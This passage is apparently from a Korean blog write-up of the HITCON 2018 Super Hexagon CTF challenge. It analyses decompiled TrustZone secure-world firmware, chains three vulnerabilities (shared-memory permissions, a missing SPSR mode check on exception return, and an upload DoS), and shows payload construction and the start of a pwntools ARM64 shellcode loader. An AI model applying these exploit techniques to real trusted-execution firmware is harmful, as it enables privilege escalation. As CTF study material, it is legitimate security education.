</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>업로드 코드이다.
이상하게 디버깅해보면 자꾸 TCI handle을 secure VA로 넘긴다.
애초에 다른 world이고 translation 방식도 다른데, secure world의 VA를 넘기는게 이상하다.
유효하지 않은 주소를 보내면, DOS가 가능하다.</p>
<p>system call interface도 공격 벡터가 될 수 있으니 다음 software interrupt handler를 분석해야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_08000a30</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> local_10;
</span></span><span style="display:flex;"><span>  uint got_from_text;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((_DAT_08085040 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    got_from_text <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(_DAT_0808503c <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    got_from_text <span style="color:#f92672">=</span> (uint)<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(_DAT_0808503c <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span>(got_from_text) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08000918</span>(ctx.r0);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000928</span>(ctx.r0,ctx.r1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000964</span>(ctx.r0,ctx.r1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080009d6</span>(ctx.r0,ctx.r1);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ctx.r0 <span style="color:#f92672">=</span> local_10;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span></code></pre></div><p>case 0은 normal world로 복귀할 때 이용한다.
S-EL3에선 ctx.x0에 여기서 Secure application에서 넘긴 리턴 값을 Normal world로 옮긴다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_08000928</span>(<span style="color:#66d9ef">int</span> r0,uint r1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((r1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x2400000</span>) <span style="color:#f92672">&amp;&amp;</span> (r0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb</span>)) {
</span></span><span style="display:flex;"><span>    _signal_handler <span style="color:#f92672">=</span> r1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>case 1은 signal handler를 할당한다.
이때 검증이 world shared memory도 signal handler 등록이 가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_08000964</span>(uint r0,uint sz)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> VA;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((((r0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> ((sz <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">&amp;&amp;</span> (sz <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>     ((VA <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800054a</span>(sz), VA <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> (iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800042e</span>(VA,sz,<span style="color:#ae81ff">10</span>), iVar1 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08001944</span>(VA,<span style="color:#ae81ff">0</span>,sz);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    VA <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> VA;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>FUN_08000964는 다음과 같이 이용가능한 VA에 물리 주소를 매핑한다.
case 2, 3은 메모리 매핑 및 언매핑 함수다.
공통적으로 다음 로직이 구현된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_080005ac</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iter;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  iter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ((iter <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">&amp;&amp;</span> (local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080005a2</span>(v0[iter]), local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>))) {
</span></span><span style="display:flex;"><span>    iter <span style="color:#f92672">=</span> iter <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x20</span>) {
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    v0[iter] <span style="color:#f92672">=</span> v0[iter] <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">0x1fU</span> <span style="color:#f92672">-</span> local_c <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>));
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> local_c <span style="color:#f92672">+</span> iter <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_c;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Secure VA를 페이지 테이블에서 제거할 때 right shift 17을 했었다.
그냥 비트맵을 확인하고 물리메모리가 비었으면 그 부분을 리턴한다.
2^12랑 곱하면 특정 비트에 해당하는 주소를 계산할 수 있다는 것을 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_08000684</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080005ac</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> secure_phys_max;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Secure physical memory에 더해가면서 할당한다.
S-EL1과 S-EL0는 Abort가 발생하면 똑같은 exception handler로 진입한다.</p>
<pre tabindex="0"><code class="language-Assembly" data-lang="Assembly">                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_08001588 (undefined  param_1 , undefined  par
             undefined         r0:1           &lt;RETURN&gt;
             undefined         r0:1           param_1
             undefined         r1:1           param_2
             undefined         r2:1           param_3
             undefined         r3:1           param_4
             undefined         Stack[0x0]:1   param_5
             undefined         Stack[0x4]:1   param_6
             undefined         Stack[0x8]:1   param_7
             undefined         Stack[0xc]:1   param_8
             undefined         Stack[0x10]:1  param_9
             undefined         Stack[0x14]:1  param_10
             undefined4        Stack[0x3c]:4  param_11                                XREF[1]:     08001588 (W)   
             undefined4        Stack[0x40]:4  param_12                                XREF[1]:     08001590 (W)   
             undefined4        Stack[0x44]:4  param_13                                XREF[1]:     0800159c (R)   
                             FUN_08001588                                    XREF[1]:     thunk_FUN_08001588:08000010 (T) , 
                                                                                          thunk_FUN_08001588:08000010 (j)   
        08001588 3c  e0  8d  e5    str        lr,[sp,#param_11 ]
        0800158c 00  e0  4f  e1    mrs        lr,spsr
        08001590 40  e0  8d  e5    str        lr,[sp,#param_12 ]
        08001594 13  00  02  f1    cps        #19
        08001598 8a  00  00  eb    bl         FUN_080017c8                                     undefined FUN_080017c8(undefined
        0800159c 44  80  9d  e5    ldr        r8,[sp,#param_13 ]
        080015a0 1f  00  02  f1    cps        #31
        080015a4 08  d0  a0  e1    cpy        sp,r8
        080015a8 17  00  a0  e3    mov        param_1 ,#0x17
        080015ac 6b  fd  ff  fb    blx        FUN_08000b62                                     undefined FUN_08000b62()
        080015b0 b1  00  00  ea    b          FUN_0800187c                                     undefined FUN_0800187c(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
</code></pre><p>spsr은 exception 발생시에 mode를 가리킨다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_08000b62</span>(<span style="color:#66d9ef">int</span> param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x17</span>) <span style="color:#f92672">&amp;&amp;</span> (_signal_handler <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08000ae0</span>();
</span></span><span style="display:flex;"><span>    _signal_handler <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000007</span>,<span style="color:#ae81ff">0xffffffff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/d9f62afaa84b05ca56f701be3d3cfa8b.png" alt=""  />

복원한 구조체의 모습이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_08000ae0</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((_signal_handler <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    ctx.cpsr <span style="color:#f92672">=</span> ctx.cpsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b11111111111111111111111111011111;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    ctx.cpsr <span style="color:#f92672">=</span> ctx.cpsr <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>b00100000;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ctx.pc <span style="color:#f92672">=</span> _signal_handler;
</span></span><span style="display:flex;"><span>  ctx.r0._0_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb</span>;
</span></span><span style="display:flex;"><span>  ctx.r0._1_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  ctx.r0._2_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  ctx.r0._3_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>thumb mode 사용 여부에 따라 세팅된다.</p>
<pre tabindex="0"><code class="language-Assembly" data-lang="Assembly">                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_0800187c (undefined  param_1 , undefined  par
             undefined         r0:1           &lt;RETURN&gt;
             undefined         r0:1           param_1
             undefined         r1:1           param_2
             undefined         r2:1           param_3
             undefined         r3:1           param_4
             undefined         Stack[0x0]:1   param_5
             undefined         Stack[0x4]:1   param_6
             undefined         Stack[0x8]:1   param_7
             undefined         Stack[0xc]:1   param_8
             undefined         Stack[0x10]:1  param_9
             undefined         Stack[0x14]:1  param_10
             undefined4        Stack[0x40]:4  param_11                                XREF[1]:     08001880 (R)   
                             FUN_0800187c                                    XREF[5]:     FUN_08000dbe:08000e5e (c) , 
                                                                                          FUN_08001530:08001558 (c) , 
                                                                                          FUN_0800155c:08001584 (c) , 
                                                                                          FUN_08001588:080015b0 (c) , 
                                                                                          FUN_080015b4:080015d8 (c)   
        0800187c 13  00  02  f1    cps        #19
        08001880 40  00  9d  e5    ldr        param_1 ,[sp,#param_11 ]
        08001884 00  f0  6f  e1    msr        spsr_cxsf,param_1
        08001888 f8  ff  ff  ea    b          LAB_08001870
</code></pre><pre tabindex="0"><code class="language-Assembly" data-lang="Assembly">                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_08001818 (undefined  param_1 , undefined  par
             undefined         r0:1           &lt;RETURN&gt;
             undefined         r0:1           param_1
             undefined         r1:1           param_2
             undefined         r2:1           param_3
             undefined         r3:1           param_4
             undefined         Stack[0x0]:1   param_5
             undefined         Stack[0x4]:1   param_6
             undefined         Stack[0x8]:1   param_7
             undefined         Stack[0xc]:1   param_8
             undefined         Stack[0x10]:1  param_9
             undefined         Stack[0x14]:1  param_10
             undefined4        Stack[0x34]:4  param_11                                XREF[1]:     08001818 (R)   
             undefined4        Stack[0x38]:4  param_12                                XREF[1]:     0800181c (R)   
                             FUN_08001818                                    XREF[1]:     FUN_080015b4:08001870 (c)   
        08001818 34  00  9d  e5    ldr        param_1 ,[sp,#param_11 ]
        0800181c 38  10  9d  e5    ldr        param_2 ,[sp,#param_12 ]
        08001820 1f  00  02  f1    cps        #31
        08001824 0d  20  a0  e1    cpy        param_3 ,sp
        08001828 00  d0  a0  e1    cpy        sp,param_1
        0800182c 01  e0  a0  e1    cpy        lr,param_2
        08001830 13  00  02  f1    cps        #19
        08001834 44  20  8d  e5    str        param_3 ,[sp,#0x44 ]
        08001838 00  00  9d  e5    ldr        param_1 ,[sp,#0x0 ]
        0800183c 04  10  9d  e5    ldr        param_2 ,[sp,#0x4 ]
        08001840 08  20  9d  e5    ldr        param_3 ,[sp,#0x8 ]
        08001844 0c  30  9d  e5    ldr        param_4 ,[sp,#0xc ]
        08001848 10  40  9d  e5    ldr        r4,[sp,#0x10 ]
        0800184c 14  50  9d  e5    ldr        r5,[sp,#0x14 ]
        08001850 18  60  9d  e5    ldr        r6,[sp,#0x18 ]
        08001854 1c  70  9d  e5    ldr        r7,[sp,#0x1c ]
        08001858 20  80  9d  e5    ldr        r8,[sp,#0x20 ]
        0800185c 24  90  9d  e5    ldr        r9,[sp,#0x24 ]
        08001860 28  a0  9d  e5    ldr        r10 ,[sp,#0x28 ]
        08001864 2c  b0  9d  e5    ldr        r11 ,[sp,#0x2c ]
        08001868 30  c0  9d  e5    ldr        r12 ,[sp,#0x30 ]
        0800186c 1e  ff  2f  e1    bx         lr
                             LAB_08001870                                    XREF[1]:     FUN_0800187c:08001888 (j)   
        08001870 e8  ff  ff  eb    bl         FUN_08001818                                     undefined FUN_08001818(undefined
        08001874 3c  e0  9d  e5    ldr        lr,[sp,#0x3c ]
        08001878 0e  f0  b0  e1    movs       pc,lr
</code></pre><p>movs pc, lr로 핸들러로 돌아간다.
이때 spsr에 대한 mode 체크가 없다는 취약점이 있다.
이 취약점을 악용하기 위해선 S-EL1에서 Access violation 관련 exception을 일으켜야 한다.</p>
<h3 id="gaining-code-execution-1">Gaining code execution<a hidden class="anchor" aria-hidden="true" href="#gaining-code-execution-1">#</a></h3>
<p>총 세 가지 취약점을 체이닝하면 임의 코드 실행을 얻을 수 있다.</p>
<ol>
<li>World shared memory mapping에 이용되는 메모리 권한 취약점.</li>
<li>Signal exception handler 구현 취약점.</li>
<li>Secure world user application upload에서 발생하는 DOS 취약점.</li>
</ol>
<h3 id="enhancing-the-exploitation-stability">Enhancing the exploitation stability<a hidden class="anchor" aria-hidden="true" href="#enhancing-the-exploitation-stability">#</a></h3>
<p>먼저 S-EL3까지 exploit 하기 위해선 shellcode를 넣을 공간이 필요했다.
기존 익스플로잇은 0x300 크기라서 그 이상가면 런타임에 memcpy가 덮히게 되고, qemu 3.0.0의 버그로 인해 디버깅이 아예 불가능하게 된다.
그래서 디버깅시엔 코드가 실행이 안되고, bp를 설정하지 않으면 코드가 실행이 된다.
결론적으로 불안정한 코드로 인해 발생한 버그라서 memcpy 보다 상위에 있는 코드 스니펫을 덮으려 시도했고, 성공적으로 덮었다.
이를 통해 S-EL0가 매핑되어있는 영역이 허용하는 한도 내에서 최대한 늘려 0x1900 바이트의 입력이 가능해졌다.
다음과 같이 수정했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> 
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x00000000e4990b0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span><span style="color:#75715e"># chunk 1</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x1670</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0100060</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x14</span> <span style="color:#75715e"># chunk 2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>		mov w2, <span style="color:#75715e">#5</span>
</span></span><span style="display:flex;"><span>    str w2, [x9, <span style="color:#75715e">#4] // idx</span>
</span></span><span style="display:flex;"><span>    movz w2, <span style="color:#75715e">#0x0000, lsl 16</span>
</span></span><span style="display:flex;"><span>    movk w2, <span style="color:#75715e">#0x1900, lsl 0</span>
</span></span><span style="display:flex;"><span>    str w2, [x9, <span style="color:#75715e">#8] // sz</span>
</span></span><span style="display:flex;"><span>    mov x8, <span style="color:#75715e">#0x0 </span>
</span></span><span style="display:flex;"><span>    loop_copy:                  
</span></span><span style="display:flex;"><span>        add x2, x21, x8
</span></span><span style="display:flex;"><span>        add x1, x20, x8
</span></span><span style="display:flex;"><span>        ldrb w0, [x1]
</span></span><span style="display:flex;"><span>        strb w0, [x2]
</span></span><span style="display:flex;"><span>        add x8, x8, <span style="color:#75715e">#1</span>
</span></span><span style="display:flex;"><span>        cmp x8, <span style="color:#75715e">#{len(SEL0_shellcode)}</span>
</span></span><span style="display:flex;"><span>        bne loop_copy
</span></span></code></pre></div><p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/35cf643bbccb2cd07961d483d2d59979.png" alt=""  />

Exploit 시나리오 자체는 전과 비슷하다.
똑같이 secure에서 flag를 가져오고, 다시 Normal world로 복귀해서 flag를 출력한다.</p>
<h2 id="exploit-code-code-execution--flag-1">Exploit code (code execution &amp; flag)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-code-execution--flag-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
